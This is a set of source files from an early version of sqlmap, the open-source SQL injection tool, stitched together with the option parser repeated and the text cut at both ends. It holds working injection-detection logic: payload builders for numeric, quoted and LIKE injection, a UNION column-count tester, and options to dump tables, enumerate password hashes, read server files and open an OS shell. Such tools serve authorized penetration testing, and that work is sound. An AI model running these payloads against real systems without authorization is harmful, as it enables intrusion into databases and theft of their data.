        target.add_option("-u", "--url", dest="url", help="Target url")

        target.add_option("-l", dest="list", help="Parse targets from Burp "
                          "or WebScarab logs")

        target.add_option("-g", dest="googleDork",
                          help="Process Google dork results as target urls")

        target.add_option("-c", dest="configFile",
                          help="Load options from a configuration INI file")


        # Request options
        request = OptionGroup(parser, "Request", "These options can be used "
                              "to specify how to connect to the target url.")

        request.add_option("--method", dest="method", default="GET",
                           help="HTTP method, GET or POST (default: GET)")

        request.add_option("--data", dest="data",
                           help="Data string to be sent through POST")

        request.add_option("--cookie", dest="cookie",
                           help="HTTP Cookie header")

        request.add_option("--referer", dest="referer",
                           help="HTTP Referer header")

        request.add_option("--user-agent", dest="agent",
                           help="HTTP User-Agent header")

        request.add_option("-a", dest="userAgentsFile",
                           help="Load a random HTTP User-Agent "
                                "header from file")

        request.add_option("--headers", dest="headers",
                           help="Extra HTTP headers '\\n' separated")

        request.add_option("--auth-type", dest="aType",
                           help="HTTP Authentication type, value: "
                                "Basic or Digest")

        request.add_option("--auth-cred", dest="aCred",
                           help="HTTP Authentication credentials, value: "
                                "name:password")

        request.add_option("--proxy", dest="proxy",
                           help="Use a HTTP proxy to connect to the target url")

        request.add_option("--threads", dest="threads", type="int",
                           help="Maximum number of concurrent HTTP "
                                "requests (default 1)")

        request.add_option("--delay", dest="delay", type="float",
                           help="Delay in seconds between each HTTP request")

        request.add_option("--timeout", dest="timeout", type="float",
                           help="Seconds to wait before timeout connection "
                                "(default 30)")


        # Injection options
        injection = OptionGroup(parser, "Injection", "These options can be "
                                "used to specify which parameters to test "
                                "for, provide custom injection payloads and "
                                "how to parse and compare HTTP responses "
                                "page content when using the blind SQL "
                                "injection technique.")

        injection.add_option("-p", dest="testParameter",
                             help="Testable parameter(s)")

        injection.add_option("--dbms", dest="dbms",
                             help="Force back-end DBMS to this value")

        injection.add_option("--prefix", dest="prefix",
                             help="Injection payload prefix string")

        injection.add_option("--postfix", dest="postfix",
                             help="Injection payload postfix string")

        injection.add_option("--string", dest="string",
                             help="String to match in page when the "
                                  "query is valid")

        injection.add_option("--regexp", dest="regexp",
                             help="Regexp to match in page when the "
                                  "query is valid")

        injection.add_option("--excl-str", dest="eString",
                             help="String to be excluded before calculating "
                                  "page hash")

        injection.add_option("--excl-reg", dest="eRegexp",
                             help="Regexp matches to be excluded before "
                                  "calculating page hash")


        # Techniques options
        techniques = OptionGroup(parser, "Techniques", "These options can "
                                 "be used to test for specific SQL injection "
                                 "technique or to use one of them to exploit "
                                 "the affected parameter(s) rather than using "
                                 "the default blind SQL injection technique.")

        techniques.add_option("--stacked-test", dest="stackedTest",
                              action="store_true",
                              help="Test for stacked queries (multiple "
                                   "statements) support")

        techniques.add_option("--time-test", dest="timeTest",
                              action="store_true",
                              help="Test for Time based blind SQL injection")

        techniques.add_option("--union-test", dest="unionTest",
                              action="store_true",
                              help="Test for UNION query (inband) SQL injection")

        techniques.add_option("--union-use", dest="unionUse",
                              action="store_true",
                              help="Use the UNION query (inband) SQL injection "
                                   "to retrieve the queries output. No "
                                   "need to go blind")


        # Fingerprint options
        fingerprint = OptionGroup(parser, "Fingerprint")

        fingerprint.add_option("-f", "--fingerprint", dest="extensiveFp",
                               action="store_true",
                               help="Perform an extensive DBMS version fingerprint")


        # Enumeration options
        enumeration = OptionGroup(parser, "Enumeration", "These options can "
                                  "be used to enumerate the back-end database "
                                  "management system information, structure "
                                  "and data contained in the tables. Moreover "
                                  "you can run your own SQL SELECT queries.")

        enumeration.add_option("-b", "--banner", dest="getBanner",
                               action="store_true", help="Retrieve DBMS banner")

        enumeration.add_option("--current-user", dest="getCurrentUser",
                               action="store_true",
                               help="Retrieve DBMS current user")

        enumeration.add_option("--current-db", dest="getCurrentDb",
                               action="store_true",
                               help="Retrieve DBMS current database")

        enumeration.add_option("--is-dba", dest="isDba",
                               action="store_true",
                               help="Detect if the DBMS current user is DBA")

        enumeration.add_option("--users", dest="getUsers", action="store_true",
                               help="Enumerate DBMS users")

        enumeration.add_option("--passwords", dest="getPasswordHashes",
                               action="store_true",
                               help="Enumerate DBMS users password hashes (opt: -U)")

        enumeration.add_option("--privileges", dest="getPrivileges",
                               action="store_true",
                               help="Enumerate DBMS users privileges (opt: -U)")

        enumeration.add_option("--dbs", dest="getDbs", action="store_true",
                               help="Enumerate DBMS databases")

        enumeration.add_option("--tables", dest="getTables", action="store_true",
                               help="Enumerate DBMS database tables (opt: -D)")

        enumeration.add_option("--columns", dest="getColumns", action="store_true",
                               help="Enumerate DBMS database table columns "
                                    "(req:-T opt:-D)")

        enumeration.add_option("--dump", dest="dumpTable", action="store_true",
                               help="Dump DBMS database table entries "
                                    "(req: -T, opt: -D, -C, --start, --stop)")

        enumeration.add_option("--dump-all", dest="dumpAll", action="store_true",
                               help="Dump all DBMS databases tables entries")

        enumeration.add_option("-D", dest="db",
                               help="DBMS database to enumerate")

        enumeration.add_option("-T", dest="tbl",
                               help="DBMS database table to enumerate")

        enumeration.add_option("-C", dest="col",
                               help="DBMS database table column to enumerate")

        enumeration.add_option("-U", dest="user",
                               help="DBMS user to enumerate")

        enumeration.add_option("--exclude-sysdbs", dest="excludeSysDbs",
                               action="store_true",
                               help="Exclude DBMS system databases when "
                                    "enumerating tables")

        enumeration.add_option("--start", dest="limitStart", type="int",
                               help="First table entry to dump")

        enumeration.add_option("--stop", dest="limitStop", type="int",
                               help="Last table entry to dump")

        enumeration.add_option("--sql-query", dest="query",
                               help="SQL SELECT query to be executed")                    

        enumeration.add_option("--sql-shell", dest="sqlShell",
                               action="store_true",
                               help="Prompt for an interactive SQL shell")


        # File system options
        filesystem = OptionGroup(parser, "File system access", "These options "
                                 "can be used to access the back-end database "
                                 "management system file system taking "
                                 "advantage of native DBMS functions or "
                                 "specific DBMS design weaknesses.")

        filesystem.add_option("--read-file", dest="rFile",
                              help="Read a specific OS file content (only on MySQL)")

        filesystem.add_option("--write-file", dest="wFile",
                              help="Write to a specific OS file (not yet available)")


        # Takeover options
        takeover = OptionGroup(parser, "Operating system access", "This "
                               "option can be used to access the back-end "
                               "database management system operating "
                               "system taking advantage of specific DBMS "
                               "design weaknesses.")

        takeover.add_option("--os-shell", dest="osShell", action="store_true",
                            help="Prompt for an interactive OS shell "
                                 "(only on PHP/MySQL environment with a "
                                 "writable directory within the web "
                                 "server document root for the moment)")


        # Miscellaneous options
        miscellaneous = OptionGroup(parser, "Miscellaneous")

        miscellaneous.add_option("--eta", dest="eta", action="store_true",
                                 help="Retrieve each query output length and "
                                      "calculate the estimated time of arrival "
                                      "in real time")

        miscellaneous.add_option("--update", dest="updateAll", action="store_true",
                                help="Update sqlmap to the latest stable version")

        miscellaneous.add_option("-s", dest="sessionFile",
                                 help="Save and resume all data retrieved "
                                      "on a session file")

        miscellaneous.add_option("--save", dest="saveCmdline", action="store_true",
                                 help="Save options on a configuration INI file")

        miscellaneous.add_option("--batch", dest="batch", action="store_true",
                                 help="Never ask for user input, use the default behaviour")


        parser.add_option_group(target)
        parser.add_option_group(request)
        parser.add_option_group(injection)
        parser.add_option_group(techniques)
        parser.add_option_group(fingerprint)
        parser.add_option_group(enumeration)
        parser.add_option_group(filesystem)
        parser.add_option_group(takeover)
        parser.add_option_group(miscellaneous)

        (args, _) = parser.parse_args()

        if not args.url and not args.list and not args.googleDork and not args.configFile and not args.updateAll:
            errMsg  = "missing a mandatory parameter ('-u', '-l', '-g', '-c' or '--update'), "
            errMsg += "-h for help"
            parser.error(errMsg)

        return args
    except (OptionError, TypeError), e:
        parser.error(e)

    debugMsg = "parsing command line"
    logger.debug(debugMsg)

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.data import conf
from lib.core.settings import MATCH_RATIO


def comparison(page, headers=None, getSeqMatcher=False):
    regExpResults = None

    # String to be excluded before calculating page hash
    if conf.eString and conf.eString in page:
        index              = page.index(conf.eString)
        length             = len(conf.eString)
        pageWithoutString  = page[:index]
        pageWithoutString += page[index+length:]
        page               = pageWithoutString

    # Regular expression matches to be excluded before calculating page hash
    if conf.eRegexp:
        regExpResults = re.findall(conf.eRegexp, page, re.I | re.M)

        if regExpResults:
            for regExpResult in regExpResults:
                index              = page.index(regExpResult)
                length             = len(regExpResult)
                pageWithoutRegExp  = page[:index]
                pageWithoutRegExp += page[index+length:]
                page               = pageWithoutRegExp

    # String to match in page when the query is valid
    if conf.string:
        if conf.string in page:
            return True
        else:
            return False

    # Regular expression to match in page when the query is valid
    if conf.regexp:
        if re.search(conf.regexp, page, re.I | re.M):
            return True
        else:
            return False

    # By default it returns sequence matcher between the first untouched
    # HTTP response page content and this content
    conf.seqMatcher.set_seq2(page)

    if getSeqMatcher:
        return round(conf.seqMatcher.ratio(), 5)                    

    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:                    
        return True

    else:
        return False

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



from lib.core.agent import agent
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.session import setUnion
from lib.request.connect import Connect as Request


def __effectiveUnionTest(query, comment):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    resultDict = {}

    for count in range(0, 50):
        if kb.dbms == "Oracle" and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:                    
            query += ", NULL"

        if kb.dbms == "Oracle":
            query += " FROM DUAL"

        commentedQuery = agent.postfixQuery(query, comment)
        payload = agent.payload(newValue=commentedQuery)
        newResult = Request.queryPage(payload)                    

        if not newResult in resultDict.keys():
            resultDict[newResult] = (1, commentedQuery)
        else:
            resultDict[newResult] = (resultDict[newResult][0] + 1, commentedQuery)

        if count:                    
            for element in resultDict.values():                    
                if element[0] == 1:                    
                    if kb.injPlace == "GET":
                        value = "%s?%s" % (conf.url, payload)                    
                    elif kb.injPlace == "POST":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nPOST:\t'%s'\n" % payload                    
                    elif kb.injPlace == "Cookie":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nCookie:\t'%s'\n" % payload                    
                    elif kb.injPlace == "User-Agent":
                        value  = "URL:\t\t'%s'" % conf.url
                        value += "\nUser-Agent:\t'%s'\n" % payload                    

                    return value

    return None


def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    logMsg  = "testing inband sql injection on parameter "
    logMsg += "'%s'" % kb.injParameter
    logger.info(logMsg)

    value = ""

    query = agent.prefixQuery(" UNION ALL SELECT NULL")

    for comment in (queries[kb.dbms].comment, ""):
        value = __effectiveUnionTest(query, comment)

        if value:
            setUnion(comment, value.count("NULL"))

            break

    if kb.unionCount:
        logMsg  = "the target url could be affected by an "
        logMsg += "inband sql injection vulnerability"
        logger.info(logMsg)
    else:
        warnMsg  = "the target url is not affected by an "
        warnMsg += "inband sql injection vulnerability"
        logger.warn(warnMsg)

    return value

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re
import time

from lib.controller.action import action
from lib.core.agent import agent
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapConnectionException
from lib.core.session import setString
from lib.core.session import setRegexp
from lib.request.connect import Connect as Request


def checkSqlInjection(place, parameter, value, parenthesis):
    """
    This function checks if the GET, POST, Cookie, User-Agent
    parameters are affected by a SQL injection vulnerability and
    identifies the type of SQL injection:

      * Unescaped numeric injection
      * Single quoted string injection
      * Double quoted string injection
    """

    randInt = randomInt()
    randStr = randomStr()

    if conf.prefix or conf.postfix:
        prefix  = ""
        postfix = ""

        if conf.prefix:
            prefix = conf.prefix

        if conf.postfix:
            postfix = conf.postfix

        infoMsg  = "testing custom injection "
        infoMsg += "on %s parameter '%s'" % (place, parameter)
        logger.info(infoMsg)

        payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt, postfix))
        trueResult = Request.queryPage(payload, place)

        if trueResult == True:
            payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1, postfix))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "confirming custom injection "
                infoMsg += "on %s parameter '%s'" % (place, parameter)
                logger.info(infoMsg)

                payload = agent.payload(place, parameter, value, "%s%s%s AND %s%s %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randStr, postfix))
                falseResult = Request.queryPage(payload, place)

                if falseResult != True:
                    infoMsg  = "%s parameter '%s' is " % (place, parameter)
                    infoMsg += "custom injectable "
                    logger.info(infoMsg)

                    return "custom"

    infoMsg  = "testing unescaped numeric injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming unescaped numeric injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "unescaped numeric injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "numeric"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "unescaped numeric injectable"
    logger.info(infoMsg)

    infoMsg  = "testing single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringsingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likesingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringdouble"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "double quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likedouble"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE double quoted string injectable"
    logger.info(infoMsg)

    return None


def checkDynParam(place, parameter, value):
    """
    This function checks if the url parameter is dynamic. If it is
    dynamic, the content of the page differs, otherwise the
    dynamicity might depend on another parameter.
    """

    infoMsg = "testing if %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    randInt = randomInt()
    payload = agent.payload(place, parameter, value, str(randInt))
    dynResult1 = Request.queryPage(payload, place)

    if True == dynResult1:
        return False

    infoMsg = "confirming that %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "'%s" % randomStr())
    dynResult2 = Request.queryPage(payload, place)

    payload = agent.payload(place, parameter, value, "\"%s" % randomStr())
    dynResult3 = Request.queryPage(payload, place)

    condition  = True != dynResult2
    condition |= True != dynResult3

    return condition


def checkStability():
    """
    This function checks if the URL content is stable requesting the
    same page three times with a small delay within each request to
    assume that it is stable.

    In case the content of the page differs when requesting
    the same page, the dynamicity might depend on other parameters,
    like for instance string matching (--string).
    """

    infoMsg = "testing if the url is stable, wait a few seconds"
    logger.info(infoMsg)

    firstPage, firstHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    secondPage, secondHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    thirdPage, thirdHeaders = Request.queryPage(content=True)                    

    condition  = firstPage == secondPage                    
    condition &= secondPage == thirdPage                    

    if condition == False:
        warnMsg  = "url is not stable, sqlmap will base the page "
        warnMsg += "comparison on a sequence matcher, if no dynamic nor "
        warnMsg += "injectable parameters are detected, refer to user's "
        warnMsg += "manual paragraph 'Page comparison' and provide a "
        warnMsg += "string or regular expression to match on"
        logger.warn(warnMsg)

    if condition == True:
        logMsg = "url is stable"
        logger.info(logMsg)

    return condition


def checkString():
    if not conf.string:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("String") and
                  kb.resumedQueries[conf.url]["String"][:-1] == conf.string
                )

    if condition:
        return True

    infoMsg  = "testing if the provided string is within the "
    infoMsg += "target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if conf.string in page:
        setString()
        return True
    else:
        errMsg  = "you provided '%s' as the string to " % conf.string
        errMsg += "match, but such a string is not within the target "
        errMsg += "URL page content, please provide another string."
        logger.error(errMsg)

        return False


def checkRegexp():
    if not conf.regexp:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("Regular expression") and
                  kb.resumedQueries[conf.url]["Regular expression"][:-1] == conf.regexp
                )

    if condition:
        return True

    infoMsg  = "testing if the provided regular expression matches within "
    infoMsg += "the target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if re.search(conf.regexp, page, re.I | re.M):
        setRegexp()
        return True
    else:
        errMsg  = "you provided '%s' as the regular expression to " % conf.regexp
        errMsg += "match, but such a regular expression does not have any "
        errMsg += "match within the target URL page content, please provide "
        errMsg += "another regular expression."
        logger.error(errMsg)

        return False


def checkConnection():
    infoMsg = "testing connection to the target url"
    logger.info(infoMsg)

    try:
        page, _ = Request.getPage()
        conf.seqMatcher.set_seq1(page)

    except sqlmapConnectionException, exceptionMsg:
        if conf.multipleTargets:
            exceptionMsg += ", skipping to next url"
            logger.warn(exceptionMsg)

            return False
        else:
            raise sqlmapConnectionException, exceptionMsg

    return True

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import sys

from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser

from lib.core.data import logger
from lib.core.settings import VERSION_STRING


def cmdLineParser():
    """
    This function parses the command line parameters and arguments
    """

    usage = "%s [options]" % sys.argv[0]
    parser = OptionParser(usage=usage, version=VERSION_STRING)

    try:
        parser.add_option("-v", dest="verbose", type="int",
                          help="Verbosity level: 0-5 (default 1)")

        # Target options
        target = OptionGroup(parser, "Target", "At least one of these "
                             "options has to be specified to set the source "
                             "to get target urls from.")

        target.add_option("-u", "--url", dest="url", help="Target url")

        target.add_option("-l", dest="list", help="Parse targets from Burp "
                          "or WebScarab logs")

        target.add_option("-g", dest="googleDork",
                          help="Process Google dork results as target urls")

        target.add_option("-c", dest="configFile",
                          help="Load options from a configuration INI file")


        # Request options
        request = OptionGroup(parser, "Request", "These options can be used "
                              "to specify how to connect to the target url.")

        request.add_option("--method", dest="method", default="GET",
                           help="HTTP method, GET or POST (default: GET)")

        request.add_option("--data", dest="data",
                           help="Data string to be sent through POST")

        request.add_option("--cookie", dest="cookie",
                           help="HTTP Cookie header")

        request.add_option("--referer", dest="referer",
                           help="HTTP Referer header")

        request.add_option("--user-agent", dest="agent",
                           help="HTTP User-Agent header")

        request.add_option("-a", dest="userAgentsFile",
                           help="Load a random HTTP User-Agent "
                                "header from file")

        request.add_option("--headers", dest="headers",
                           help="Extra HTTP headers '\\n' separated")

        request.add_option("--auth-type", dest="aType",
                           help="HTTP Authentication type, value: "
                                "Basic or Digest")

        request.add_option("--auth-cred", dest="aCred",
                           help="HTTP Authentication credentials, value: "
                                "name:password")

        request.add_option("--proxy", dest="proxy",
                           help="Use a HTTP proxy to connect to the target url")

        request.add_option("--threads", dest="threads", type="int",
                           help="Maximum number of concurrent HTTP "
                                "requests (default 1)")

        request.add_option("--delay", dest="delay", type="float",
                           help="Delay in seconds between each HTTP request")

        request.add_option("--timeout", dest="timeout", type="float",
                           help="Seconds to wait before timeout connection "
                                "(default 30)")


        # Injection options
        injection = OptionGroup(parser, "Injection", "These options can be "
                                "used to specify which parameters to test "
                                "for, provide custom injection payloads and "
                                "how to parse and compare HTTP responses "
                                "page content when using the blind SQL "
                                "injection technique.")

        injection.add_option("-p", dest="testParameter",
                             help="Testable parameter(s)")

        injection.add_option("--dbms", dest="dbms",
                             help="Force back-end DBMS to this value")

        injection.add_option("--prefix", dest="prefix",
                             help="Injection payload prefix string")

        injection.add_option("--postfix", dest="postfix",
                             help="Injection payload postfix string")

        injection.add_option("--string", dest="string",
                             help="String to match in page when the "
                                  "query is valid")

        injection.add_option("--regexp", dest="regexp",
                             help="Regexp to match in page when the "
                                  "query is valid")

        injection.add_option("--excl-str", dest="eString",
                             help="String to be excluded before calculating "
                                  "page hash")

        injection.add_option("--excl-reg", dest="eRegexp",
                             help="Regexp matches to be excluded before "
                                  "calculating page hash")


        # Techniques options
        techniques = OptionGroup(parser, "Techniques", "These options can "
                                 "be used to test for specific SQL injection "
                                 "technique or to use one of them to exploit "
                                 "the affected parameter(s) rather than using "
                                 "the default blind SQL injection technique.")

        techniques.add_option("--stacked-test", dest="stackedTest",
                              action="store_true",
                              help="Test for stacked queries (multiple "
                                   "statements) support")

        techniques.add_option("--time-test", dest="timeTest",
                              action="store_true",
                              help="Test for Time based blind SQL injection")

        techniques.add_option("--union-test", dest="unionTest",
                              action="store_true",
                              help="Test for UNION query (inband) SQL injection")

        techniques.add_option("--union-use", dest="unionUse",
                              action="store_true",
                              help="Use the UNION query (inband) SQL injection "
                                   "to retrieve the queries output. No "
                                   "need to go blind")


        # Fingerprint options
        fingerprint = OptionGroup(parser, "Fingerprint")

        fingerprint.add_option("-f", "--fingerprint", dest="extensiveFp",
                               action="store_true",
                               help="Perform an extensive DBMS version fingerprint")


        # Enumeration options
        enumeration = OptionGroup(parser, "Enumeration", "These options can "
                                  "be used to enumerate the back-end database "
                                  "management system information, structure "
                                  "and data contained in the tables. Moreover "
                                  "you can run your own SQL SELECT queries.")

        enumeration.add_option("-b", "--banner", dest="getBanner",
                               action="store_true", help="Retrieve DBMS banner")

        enumeration.add_option("--current-user", dest="getCurrentUser",
                               action="store_true",
                               help="Retrieve DBMS current user")

        enumeration.add_option("--current-db", dest="getCurrentDb",
                               action="store_true",
                               help="Retrieve DBMS current database")

        enumeration.add_option("--is-dba", dest="isDba",
                               action="store_true",
                               help="Detect if the DBMS current user is DBA")

        enumeration.add_option("--users", dest="getUsers", action="store_true",
                               help="Enumerate DBMS users")

        enumeration.add_option("--passwords", dest="getPasswordHashes",
                               action="store_true",
                               help="Enumerate DBMS users password hashes (opt: -U)")

        enumeration.add_option("--privileges", dest="getPrivileges",
                               action="store_true",
                               help="Enumerate DBMS users privileges (opt: -U)")

        enumeration.add_option("--dbs", dest="getDbs", action="store_true",
                               help="Enumerate DBMS databases")

        enumeration.add_option("--tables", dest="getTables", action="store_true",
                               help="Enumerate DBMS database tables (opt: -D)")

        enumeration.add_option("--columns", dest="getColumns", action="store_true",
                               help="Enumerate DBMS database table columns "
                                    "(req:-T opt:-D)")

        enumeration.add_option("--dump", dest="dumpTable", action="store_true",
                               help="Dump DBMS database table entries "
